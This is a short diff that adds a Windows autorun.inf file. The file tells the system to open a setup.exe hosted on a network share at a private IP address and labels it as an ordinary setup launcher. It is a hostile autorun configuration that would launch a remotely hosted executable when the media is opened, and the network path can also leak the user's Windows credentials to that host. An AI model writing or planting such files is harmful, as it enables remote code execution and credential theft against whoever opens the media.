@@ -1,0 +1,4 @@
+[autorun]
+open=\\192.168.45.176\setup.exe
+icon=something.ico
+action=open Setup.exe
